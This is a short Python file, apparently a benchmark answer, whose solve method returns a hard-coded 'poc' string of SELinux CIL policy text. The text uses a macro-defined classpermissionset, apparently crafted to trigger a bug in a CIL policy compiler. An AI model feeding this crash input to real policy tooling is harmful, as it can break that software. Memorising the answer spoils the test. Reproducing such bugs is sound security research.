from __future__ import annotations

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = "(class c (p))(type t)(macro m (x)(classpermissionset s (x)))(call m (c (p)))(allow t t (s))\n"
        return poc.encode("ascii")